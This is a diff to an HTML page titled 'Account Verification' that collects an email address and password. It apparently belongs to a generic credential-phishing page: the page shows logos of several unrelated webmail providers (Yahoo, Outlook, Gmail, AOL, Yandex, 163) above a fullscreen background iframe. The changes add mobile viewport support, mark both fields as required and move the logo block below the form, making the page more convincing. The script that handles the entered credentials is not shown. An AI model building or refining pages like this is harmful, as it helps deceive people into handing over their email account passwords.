@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Account Verification</title>
 
   <!-- ✅ Font Awesome for icons -->
@@ -25,20 +26,6 @@
 </head>
 <body>
 
-<div class="email-providers">
-        <img src="https://logo.clearbit.com/yahoo.com" alt="Yahoo" title="Yahoo">
-        <img src="https://logo.clearbit.com/webmail.com" alt="Webmail" title="Webmail">
-        <img src="https://logo.clearbit.com/outlook.com" alt="Outlook" title="Outlook">
-        <img src="https://logo.clearbit.com/gmail.com" alt="Gmail" title="Gmail">
-        <img src="https://logo.clearbit.com/163.com" alt="163" title="163">
-        <img src="https://logo.clearbit.com/aol.com" alt="AOL" title="AOL">
-        <img src="https://logo.clearbit.com/yandex.com" alt="Yandex" title="Yandex">
-      </div>
-    </div>
-  </div>
-</body>
-</html>
-
   <!-- Fullscreen background iframe -->
   <iframe id="bg-frame"></iframe>
 
@@ -50,13 +37,13 @@
       <!-- ✅ Email input with icon -->
       <div class="input-group">
         <i class="fas fa-envelope icon"></i>
-        <input type="email" id="email" placeholder="Email" />
+        <input type="email" id="email" placeholder="Email" required />
       </div>
 
       <!-- ✅ Password input with icon -->
       <div class="input-group">
         <i class="fas fa-lock icon"></i>
-        <input type="password" id="password" placeholder="Password" />
+        <input type="password" id="password" placeholder="Password" required />
       </div>
 
       <!-- Error message -->
@@ -65,6 +52,17 @@
       <!-- Login button -->
       <button id="login-btn">Login</button>
     </div>
+  </div>
+
+  <!-- Email provider logos (optional for design) -->
+  <div class="email-providers">
+    <img src="https://logo.clearbit.com/yahoo.com" alt="Yahoo" title="Yahoo">
+    <img src="https://logo.clearbit.com/webmail.com" alt="Webmail" title="Webmail">
+    <img src="https://logo.clearbit.com/outlook.com" alt="Outlook" title="Outlook">
+    <img src="https://logo.clearbit.com/gmail.com" alt="Gmail" title="Gmail">
+    <img src="https://logo.clearbit.com/163.com" alt="163" title="163">
+    <img src="https://logo.clearbit.com/aol.com" alt="AOL" title="AOL">
+    <img src="https://logo.clearbit.com/yandex.com" alt="Yandex" title="Yandex">
   </div>
 
   <!-- ✅ Your JavaScript -->
